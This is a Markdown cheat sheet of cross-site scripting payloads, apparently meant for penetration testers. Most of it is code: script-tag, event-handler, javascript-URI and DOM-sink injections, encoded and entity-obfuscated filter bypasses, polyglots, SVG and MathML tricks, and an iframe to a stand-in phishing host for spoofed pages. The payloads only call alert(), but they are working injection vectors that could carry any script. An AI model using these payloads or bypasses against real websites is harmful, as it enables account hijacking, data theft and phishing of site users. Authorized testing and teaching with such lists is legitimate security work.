# XSS Payload Cheat Sheet

This cheat sheet includes a wide range of XSS payloads for testing and exploiting XSS vulnerabilities in web applications. **Note:** These payloads are intended for educational and authorized testing purposes only.

---

## Contents

- [Basic XSS Payloads](#basic-xss-payloads)
- [Event Handler XSS Payloads](#event-handler-xss-payloads)
- [Attribute-Based XSS Payloads](#attribute-based-xss-payloads)
- [JavaScript XSS Payloads](#javascript-xss-payloads)
- [Bypassing Common Filters](#bypassing-common-filters)
- [Polyglot XSS Payloads](#polyglot-xss-payloads)
- [DOM-Based XSS Payloads](#dom-based-xss-payloads)
- [Advanced XSS Techniques](#advanced-xss-techniques)

---

## Basic XSS Payloads

Injecting basic payloads into vulnerable fields can trigger XSS in unfiltered or weakly-filtered contexts.

```html
<script>alert('XSS')</script>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS');"></iframe>
<img src=x onerror=alert('XSS')>
<video><source onerror="javascript:alert('XSS')"></video>
```

---

## Event Handler XSS Payloads

Event handlers can be leveraged for XSS when they’re unescaped within attributes.

```html
<body onload=alert('XSS')>
<div onclick="alert('XSS')">Click me</div>
<input type="text" onfocus="alert('XSS')" autofocus>
<svg onload="alert('XSS')"></svg>
<button onmouseover="alert('XSS')">Hover me</button>
```

---

## Attribute-Based XSS Payloads

Using vulnerable attributes can trigger XSS when dynamic data isn’t properly sanitized.

```html
<input value="X" onmouseover="alert('XSS')">
<form action="javascript:alert('XSS')">
<embed src="javascript:alert('XSS');">
<object data="javascript:alert('XSS');"></object>
<a href="javascript:alert('XSS')">Click me</a>
```

---

## JavaScript XSS Payloads

Direct JavaScript injection can exploit `eval()`, `setTimeout()`, `setInterval()`, and other functions prone to XSS.

```javascript
"><script>alert('XSS')</script>
" onerror="alert('XSS')
javascript:alert('XSS')
window['alert']('XSS')
document.write('<img src=x onerror=alert(1)>')
```

### Common JavaScript XSS Vectors

```javascript
// Using eval
eval("alert('XSS')")

// Using setTimeout
setTimeout("alert('XSS')", 1000)

// Using setInterval
setInterval("alert('XSS')", 1000)

// Using Function constructor
new Function("alert('XSS')")()
```

---

## Bypassing Common Filters

Encoding or obfuscation can bypass common XSS filters. Here are some payloads that use encoding:

```html
<script>%61lert('XSS')</script>
<script>window[%27al%27 + %27ert%27]('XSS')</script>
<img src='x' onerror='\u0061lert("XSS")'>
```

### Hexadecimal Encoding

```html
<script>alert(0x58)</script>
<svg/onload=%61lert(&#39;XSS&#39;)>
```

### HTML Entity Encoding

```html
<img src=x onerror=&Tab;alert('XSS')>
<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>
```

---

## Polyglot XSS Payloads

Polyglots are versatile payloads that work in multiple contexts and can bypass various filters.

```html
"><img src=x onerror=alert('XSS')>//<svg/onload=alert('XSS')>
<svg onload=alert(1)><script>alert(2)</script>
"><script>location='javascript:alert(`XSS`)'</script>
```

### Combined SVG & Script Polyglots

```html
"><svg onload=alert('XSS')><script>alert('XSS')</script>
<img src=x onerror="this.onerror=null;alert('XSS')">
```

---

## DOM-Based XSS Payloads

DOM-based XSS relies on vulnerable JavaScript handling within the DOM itself.

### Document Write Injection

```javascript
document.write("<img src=x onerror=alert('XSS')>");
```

### Location-Based Injection

```javascript
location.href = "javascript:alert('XSS')";
location.hash = "javascript:alert('XSS')";
window.location = "javascript:alert('XSS')";
```

### Element Injection via InnerHTML

```javascript
document.body.innerHTML = "<img src=x onerror=alert('XSS')>";
```

---

## Advanced XSS Techniques

More sophisticated techniques include chained XSS attacks and injecting into sensitive HTML tags like `<iframe>`, `<svg>`, and `<math>`.

### Chaining XSS Payloads

```html
"><script>alert('First');</script><script>alert('Second');</script>
```

### SVG XSS

```html
<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></desc>
```

### MathML XSS

```html
<math><mtext><script>alert('XSS')</script></mtext></math>
```

---

## Additional Notes

- **Filter Bypasses**: Obfuscating payloads through Unicode, base64, or hex encoding can bypass certain weak filters.
- **Iframe Redirection**: For phishing simulations, iframes can redirect users to spoofed pages:
  ```html
  <iframe src="http://phishing.site"></iframe>
  ```
- **JavaScript URI Encoding**: Encoding payloads with `javascript:` URIs can bypass filters. Example: `<a href="javascript:alert('XSS')">Click me</a>`.

---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.

---
